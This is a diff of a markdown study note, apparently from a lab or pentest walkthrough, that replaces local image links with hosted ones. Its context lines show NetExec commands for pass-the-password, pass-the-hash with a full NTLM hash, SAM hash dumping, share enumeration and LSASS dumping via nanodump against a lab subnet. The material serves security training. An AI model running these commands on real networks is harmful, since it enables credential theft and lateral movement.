@@ -65,7 +65,8 @@ For example:
 
 - When conducting password pass attacks, it’s important to specify ranges or subnets.
 
-![Example of passing the password to a subnet](../../../Images/Pasted%20image%2020250220214045.png)
+![Pasted image 20250220214045](https://github.com/user-attachments/assets/e814a720-569f-47bb-8b40-c1ddd4aba228)
+
 
 - In this example, the password was passed to both workstations, where **j.smith** is a local administrator.
 - On the Domain Controller (DC), while we had successful authentication, **j.smith** wasn’t a local admin, so we didn’t gain control of the DC.
@@ -84,7 +85,8 @@ For example:
 
 `nxc smb 192.168.163.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth`
 
-![Example of passing the hash](../../../Images/Pasted%20image%2020250220214600.png)
+![Pasted image 20250220214600](https://github.com/user-attachments/assets/9e015e73-4736-425c-aa78-47f957b91dfe)
+
 
 - It's common to reuse the same local administrator password across devices in an environment. Once one is compromised, it can be passed around to other machines.
 - In this case, the DC's local admin password was different from the one used on the workstations, so we were unable to access the DC.
@@ -95,7 +97,7 @@ For example:
 
 `nxc smb 192.168.163.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --sam`
 
-![Example of SAM dump](../../../Images/Pasted%20image%2020250220214813.png)
+![Pasted image 20250220214813](https://github.com/user-attachments/assets/0d2ea076-1598-4693-aa4d-f0c898c32a11)
 
 - This command dumps the hashes and stores them in our database.
 
@@ -105,7 +107,8 @@ For example:
 
 `nxc smb 192.168.163.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --shares`
 
-![Example of share enumeration](../../../Images/Pasted%20image%2020250220214949.png)
+![Pasted image 20250220214949](https://github.com/user-attachments/assets/9e87858f-0f21-463f-94b5-675f5fb449eb)
+
 
 ---
 
@@ -121,7 +124,7 @@ For example:
 
 `sudo nxc smb 192.168.163.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth -M nanodump`
 
-![Example of nanodump usage](../../../Images/Pasted%20image%2020250220222133.png)
+![Pasted image 20250220222133](https://github.com/user-attachments/assets/73dde39c-5d95-4735-b69e-875b1765b816)
 
 ---
 
